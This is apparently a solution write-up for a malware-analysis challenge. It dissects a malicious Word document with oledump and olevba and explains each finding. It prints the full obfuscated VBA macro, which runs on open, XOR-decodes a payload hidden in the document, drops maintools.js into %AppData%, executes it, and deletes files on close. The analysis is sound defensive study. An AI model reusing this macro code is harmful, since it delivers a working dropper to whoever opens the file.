# Solutions

### Q1
Based on the scenareo described above, we can guess that the file is a word document submitted by a colleague from the Finance department.

### Q2
The first instinct is to check for macros. Macros are small programs embedded in Office documents that can automate tasks. Attackers often hide payloads in VBA (Visual Basic for Applications) macros because they execute automatically when the document is opened if AutoExec routines like AutoOpen or AutoClose are present.

### Q3
Use oledump.py to enumerate streams and identify macros.
You can easily run the following command:

```
python oledump.py 49b367ac261a722a7c2bbbc328c32545.docx
```

Ouput below:

```
$ python oledump.py 49b367ac261a722a7c2bbbc328c32545.docx
  1:       114 '\x01CompObj'
  2:       284 '\x05DocumentSummaryInformation'
  3:       392 '\x05SummaryInformation'
  4:      8017 '1Table'
  5:      4096 'Data'
  6:       483 'Macros/PROJECT'
  7:        65 'Macros/PROJECTwm'
  8: M    7117 'Macros/VBA/Module1'
  9: m    1104 'Macros/VBA/ThisDocument'
 10:      3467 'Macros/VBA/_VBA_PROJECT'
 11:      2964 'Macros/VBA/__SRP_0'
 12:       195 'Macros/VBA/__SRP_1'
 13:      2717 'Macros/VBA/__SRP_2'
 14:       290 'Macros/VBA/__SRP_3'
 15:       565 'Macros/VBA/dir'
 16:        76 'ObjectPool/_1541577328/\x01CompObj'
 17: O   20301 'ObjectPool/_1541577328/\x01Ole10Native'
 18:      5000 'ObjectPool/_1541577328/\x03EPRINT'
 19:         6 'ObjectPool/_1541577328/\x03ObjInfo'
 20:    133755 'WordDocument'
```
Conclusion: 
The output reveals multiple streams, including Macros/VBA/Module1 and Macros/VBA/ThisDocument. The presence of these streams confirms that the document contains macros. This is a strong indicator of potential malicious behavior, especially when combined with AutoExec routines. At this stage, we conclude that the file warrants deeper analysis because macros are rarely present in legitimate business documents unless explicitly required.

### Q4
Run olevba from oletools to extract and analyze the VBA code.

```
$ python -m oletools.olevba 49b367ac261a722a7c2bbbc328c32545.docx
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.2 on Python 3.14.0 - http://decalage.info/python/oletools
===============================================================================
FILE: 49b367ac261a722a7c2bbbc328c32545.docx
Type: OLE
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: 49b367ac261a722a7c2bbbc328c32545.docx - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas
in file: 49b367ac261a722a7c2bbbc328c32545.docx - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Public OBKHLrC3vEDjVL As String
Public B8qen2T433Ds1bW As String
Function Q7JOhn5pIl648L6V43V(EjqtNRKMRiVtiQbSblq67() As Byte, M5wI32R3VF2g5B21EK4d As Long) As Boolean
Dim THQNfU76nlSbtJ5nX8LY6 As Byte
THQNfU76nlSbtJ5nX8LY6 = 45
For i = 0 To M5wI32R3VF2g5B21EK4d - 1
EjqtNRKMRiVtiQbSblq67(i) = EjqtNRKMRiVtiQbSblq67(i) Xor THQNfU76nlSbtJ5nX8LY6
THQNfU76nlSbtJ5nX8LY6 = ((THQNfU76nlSbtJ5nX8LY6 Xor 99) Xor (i Mod 254))
Next i
Q7JOhn5pIl648L6V43V = True
End Function
Sub AutoClose()
On Error Resume Next
Kill OBKHLrC3vEDjVL
On Error Resume Next
Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
R7Ks7ug4hRR2weOy7.DeleteFile B8qen2T433Ds1bW & "\*.*", True
Set R7Ks7ug4hRR2weOy7 = Nothing
End Sub
Sub AutoOpen()
On Error GoTo MnOWqnnpKXfRO
Dim NEnrKxf8l511
Dim N18Eoi6OG6T2rNoVl41W As Long
Dim M5wI32R3VF2g5B21EK4d As Long
N18Eoi6OG6T2rNoVl41W = FileLen(ActiveDocument.FullName)
NEnrKxf8l511 = FreeFile
Open (ActiveDocument.FullName) For Binary As #NEnrKxf8l511
Dim E2kvpmR17SI() As Byte
ReDim E2kvpmR17SI(N18Eoi6OG6T2rNoVl41W)
Get #NEnrKxf8l511, 1, E2kvpmR17SI
Dim KqG31PcgwTc2oL47hjd7Oi As String
KqG31PcgwTc2oL47hjd7Oi = StrConv(E2kvpmR17SI, vbUnicode)
Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
Dim VUy5oj112fLw51h6S
Set VUy5oj112fLw51h6S = CreateObject("vbscript.regexp")
VUy5oj112fLw51h6S.Pattern = "MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh"
Set I4j833DS5SFd34L3gwYQD = VUy5oj112fLw51h6S.Execute(KqG31PcgwTc2oL47hjd7Oi)
Dim Y5t4Ul7o385qK4YDhr
If I4j833DS5SFd34L3gwYQD.Count = 0 Then
GoTo MnOWqnnpKXfRO
End If
For Each N34rtRBIU3yJO2cmMVu In I4j833DS5SFd34L3gwYQD
Y5t4Ul7o385qK4YDhr = N34rtRBIU3yJO2cmMVu.FirstIndex
Exit For
Next
Dim Wk4o3X7x1134j() As Byte
Dim KDXl18qY4rcT As Long
KDXl18qY4rcT = 16827
ReDim Wk4o3X7x1134j(KDXl18qY4rcT)
Get #NEnrKxf8l511, Y5t4Ul7o385qK4YDhr + 81, Wk4o3X7x1134j
If Not Q7JOhn5pIl648L6V43V(Wk4o3X7x1134j(), KDXl18qY4rcT + 1) Then
GoTo MnOWqnnpKXfRO
End If
B8qen2T433Ds1bW = Environ("appdata") & "\Microsoft\Windows"
Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
If Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then
B8qen2T433Ds1bW = Environ("appdata")
End If
Set R7Ks7ug4hRR2weOy7 = Nothing
Dim K764B5Ph46Vh
K764B5Ph46Vh = FreeFile
OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"
Open (OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh
Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
Close #K764B5Ph46Vh
Erase Wk4o3X7x1134j
Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
R66BpJMgxXBo2h.Run """" + OBKHLrC3vEDjVL + """" + " EzZETcSXyKAdF_e5I2i1"
ActiveDocument.Save
Exit Sub
MnOWqnnpKXfRO:
Close #K764B5Ph46Vh
ActiveDocument.Save
End Sub








+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |maintools.js        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

```
The macro contains AutoOpen and AutoClose routines, meaning the code runs automatically when the document is opened or closed. It uses CreateObject and WScript.Shell.Run to execute system commands, which is a classic technique for launching external scripts. Additionally, the macro writes a file named maintools.js on disk. The presence of XOR-based obfuscation further suggests an attempt to hide malicious strings, making static analysis harder.

### Q5
The macro searches for a specific marker string inside the document using regular expressions. This marker acts as a delimiter for the hidden payload embedded in the document’s content.

We find: MxOH8pcrlepD3SRfF5ffVTy86Xe41L2qLnqTd5d5R7Iq87mWGES55fswgG84hIRdX74dlb1SiFOkR1Hh

### Q6
The macro creates the malicious file in %AppData%\Microsoft\Windows. If this directory does not exist, it falls back to %AppData%. Storing files in user-space directories avoids requiring administrative privileges and helps bypass basic security controls. The file name is maintools.js, which is later executed via WScript.Shell.Run. 

### Q7
The macro follows a classic dropper pattern:

1. It reads the document content and locates the marker.
2. It decrypts the hidden payload using XOR-based obfuscation.
3. It writes the payload as a JavaScript file (maintools.js) in the AppData directory.
4. It executes the script using WScript.Shell.Run, passing arguments that may serve as keys or commands.
5. It cleans up traces by deleting files when the document is closed.